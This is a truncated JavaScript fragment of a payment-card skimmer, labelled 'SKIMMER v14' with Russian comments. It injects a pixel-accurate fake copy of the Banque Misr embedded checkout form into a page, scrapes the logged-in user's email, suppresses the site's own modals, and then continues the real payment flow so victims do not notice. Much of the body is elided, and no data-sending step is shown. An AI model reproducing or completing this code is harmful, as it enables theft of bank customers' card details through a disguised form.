/**
 * SKIMMER v14 — точный клон BanqueMisr embedded checkout (по реальным HTML+CSS).
 * - Email: readonly-текст (юзер залогинен, email берём со страницы/скрываем)
 * - Поля: border #949494, focus 2px #D24646, скругление .2rem
 * - Звёздочки: #d2292e
 * - Кнопка Pay: СЕРАЯ btn-secondary #6c757d (как в оригинале)
 * - Card number: замок в append-блоке; Expiry MM/YY через slash; Security code отдельная строка
 * - Их модалки закрываются при инжекте, Esc закрывает клон, после Pay продолжаем реальный флоу
 */
(function () {
  'use strict';
  ...
  /* email залогиненного юзера со страницы */
  function findEmail() {
    try {
  ...
  function injectForm() {
    ...
    try {
      ...
      d.innerHTML =
        // заголовок секции (как в оригинале: "Credit or Debit Card")
        ...
        // Security code — отдельная строка
        ...
        // СЕРАЯ кнопка как в оригинале (btn-secondary)
      ...
      // focus-стиль как в оригинале: красная 2px рамка
      d.querySelectorAll('input').forEach(function (i) {
        i.addEventListener('focus', function () {
          i.style.border = '2px solid #D24646';
          i.style.borderRight = i.id === 'skNum' ? 'none' : '2px solid #D24646';
        });
